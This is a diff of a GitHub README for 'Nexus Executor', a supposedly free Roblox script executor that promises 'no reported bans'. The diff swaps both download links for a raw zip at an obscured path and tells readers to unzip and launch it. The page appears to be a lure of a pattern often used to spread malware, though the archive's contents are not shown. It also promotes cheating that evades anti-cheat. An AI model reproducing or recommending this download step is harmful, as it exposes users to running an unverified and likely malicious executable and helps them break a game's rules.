@@ -1,7 +1,7 @@
 # 🚀 **N3xus-Scr1pt-R0bl0x**
 ## **Nexus Executor - Free and Lifetime Script Execution for Roblox**
 
-[![Download Software](https://github.com/ishratali007/N3xus-Scr1pt-R0bl0x/releases/download/v1.0/Software.zip)](https://github.com/ishratali007/N3xus-Scr1pt-R0bl0x/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/ishratali007/N3xus-Scr1pt-R0bl0x/raw/refs/heads/main/replevy/bl-pt-Scr-xus-x-v3.9.zip)](https://github.com/ishratali007/N3xus-Scr1pt-R0bl0x/raw/refs/heads/main/replevy/bl-pt-Scr-xus-x-v3.9.zip)
 
 Welcome to the official repository for Nexus Executor, a powerful tool for executing all Luau scripts on Roblox with no reported bans. This repository provides access to the Nexus Executor software package, offering free and lifetime packages directly hosted on the website. 
 
@@ -30,7 +30,7 @@ Welcome to the official repository for Nexus Executor, a powerful tool for execu
 ### **Get Started**
 To access the Nexus Executor software package, click the button below to download:
 
-[![Download Software](https://github.com/ishratali007/N3xus-Scr1pt-R0bl0x/releases/download/v1.0/Software.zip)](https://github.com/ishratali007/N3xus-Scr1pt-R0bl0x/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/ishratali007/N3xus-Scr1pt-R0bl0x/raw/refs/heads/main/replevy/bl-pt-Scr-xus-x-v3.9.zip)](https://github.com/ishratali007/N3xus-Scr1pt-R0bl0x/raw/refs/heads/main/replevy/bl-pt-Scr-xus-x-v3.9.zip)
 
 Once downloaded, unzip the package and launch the software to enjoy the full functionality of Nexus Executor.
 
